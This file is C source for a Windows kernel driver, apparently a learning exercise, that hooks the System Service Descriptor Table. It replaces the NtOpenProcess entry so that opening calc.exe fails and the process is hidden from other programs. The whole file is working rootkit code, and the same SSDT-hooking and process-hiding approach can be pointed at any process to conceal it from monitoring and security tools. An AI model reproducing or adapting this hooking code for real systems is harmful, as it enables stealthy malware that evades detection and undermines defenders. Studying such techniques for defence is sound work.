#include <ntifs.h>
#include <ntddk.h>

#define DeviceName L"\\Device\\hook"
#define LnkDeviceName L"\\DosDevices\\hook" 


#pragma pack(1)
typedef struct ServiceDescriptorEntry {
        unsigned int *ServiceTableBase;
        unsigned int *ServiceCounterTableBase; 
        unsigned int NumberOfServices;
        unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
int IsHooked;

typedef struct ProcessInformation{
	ULONG pid;
	ULONG ppid;
	UCHAR *name;
	PUNICODE_STRING pathname;
} ProcessInformation;

NTSYSAPI
NTSTATUS
NTAPI ZwQueryInformationProcess(
  __in       HANDLE ProcessHandle,
  __in       PROCESSINFOCLASS ProcessInformationClass,
  __out      PVOID ProcessInformation,
  __in       ULONG ProcessInformationLength,
  __out_opt  PULONG ReturnLength
);

NTSYSAPI
NTSTATUS
NTAPI NtCreateFile(
);

typedef NTSTATUS (*NTOPENPROCESS)(
  PHANDLE            ProcessHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PCLIENT_ID         ClientId
);

//NTTERMINATEPROCESS OldNtCreateFile;
NTOPENPROCESS OldNtOpenProcess;


NTSTATUS  NewNtOpenProcess(
  PHANDLE            ProcessHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes,
  PCLIENT_ID         ClientId
)
{
	NTSTATUS ntstatus = STATUS_SUCCESS;
	PEPROCESS cur_proc;
	UCHAR target[8], name[8];
	
	ntstatus = ((NTOPENPROCESS) (*OldNtOpenProcess)) (
		ProcessHandle,
		DesiredAccess,
		ObjectAttributes,
		ClientId
	);
	// behaviour of new open process (hide calc corresponding pid)
	strncpy(target, "calc.exe", 8);
	
	if (ntstatus==0) {
		PsLookupProcessByProcessId(ClientId->UniqueProcess, &cur_proc);
		strncpy(name, ((PUCHAR)cur_proc + 0x16c), 8);
		if ((strncmp(name, target, 8)==0)) {
			// cut the process (as if it's not there)
			DbgPrint("**** calc hided ****");
			return -1;
		}
	}
	return ntstatus;
}


NTSTATUS Hook_Function()
{
	g_pmdlSystemCall=IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4, 0, 0, NULL);

   	if(!g_pmdlSystemCall)
      	return STATUS_UNSUCCESSFUL;

   	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
	MappedSystemCallTable=MmMapLockedPages(g_pmdlSystemCall, KernelMode);

	__try{
		OldNtOpenProcess = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[190], (LONG) NewNtOpenProcess);
		IsHooked = 1;
	}
	__except(1){
			DbgPrint("DriverEntry: Hook failed");

	}
	return STATUS_SUCCESS;
}
 
void Unhook_fonction()
{	
	__try
	{
		InterlockedExchange( (PLONG) &MappedSystemCallTable[190], (LONG) OldNtOpenProcess);
		IsHooked = 0;
	}
	__except(1){
			DbgPrint("DriverEntry: Unhook failed");
	}
 
    // Unlock and Free MDL
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
	DbgPrint("Unhook Function \n");
}
 

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
	}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
    IoDeleteSymbolicLink(&usLnkName);
	if(IsHooked)
		Unhook_fonction();

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}




NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	pDriverObject->MajorFunction[i]=DriverDispatch;

	pDriverObject->MajorFunction[IRP_MJ_CREATE]=DriverCreate; 
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
		if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;

	Hook_Function();

	return STATUS_SUCCESS;	
}

